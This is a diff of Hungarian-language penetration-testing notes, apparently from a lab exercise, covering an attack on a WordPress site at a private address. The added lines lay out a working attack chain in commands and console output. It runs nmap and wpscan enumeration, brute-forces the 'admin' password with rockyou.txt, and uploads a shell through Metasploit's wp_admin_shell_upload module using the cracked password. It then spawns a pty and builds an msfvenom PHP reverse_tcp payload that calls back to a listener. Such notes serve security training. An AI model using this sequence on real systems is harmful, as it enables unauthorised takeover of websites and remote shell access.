@@ -4,7 +4,7 @@ msfvenom -l playloads
 
 // listener
 30.0.1.11
-nc -lvnp 4444 
+nc -lvnp 4444 ugyanazon a porton
 
 // ip cím kiírása
 ip a
@@ -29,6 +29,7 @@ sudo nmap -sS -sV 40.0.4.10
 dirbuster
 /usr/share/wordlists/dirb/common.txt
 
+//wordpress scan
 wpscan 
 -h
 -o output file
@@ -44,10 +45,38 @@ aggresszív mód (jobban észrevesznek) passzív mód, alap beállítás kevert
   -at all themes
   -ap all plugins
 -U username listája
-  --lgin-rui URI ha zhn máshol található a login uri https://40.0.4.27 /secret
+  --login-rui URI ha zhn máshol található a login uri https://40.0.4.27 /secret
 --stealthy
+
 
 wpscan --url http://40.0.4.10 -e u,at,ap
 
 wpscan --url http://40.0.4.10 --usernames admin --passwords /usr/share/wordlists/rockyou.txt 
 ha < 5k akkor nem jelszót kell brute forceolni
+
+comments.php-t kell szerkeszteni általában
+
+msfconsole //metasploit exploitok msfvenom benne van
+msfconsole search wordpress
+search wordpress shell
+a szám dinamkusan változik
+wp admin shell upload
+use exploit exploit/unix/webapp/wp_admin_shell_upload
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> options
+nézni a yeseket module options
+  rportot átírni ahol a website van
+  targeturi
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set password finalfantasy
+password => finalfantasy
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set rhosts 40.0.4.10
+rhosts => 40.0.4.10
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set username admin
+username => admin
+meterpreter> shell
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=30.0.1.11 LPORT=4444 -f raw > metshell.php
+msfconsole > use exploit/multi/handler // ez csak listener 
+set payload php/meterpreter/reverse_tcp
+run // olyan mint a netcates listener
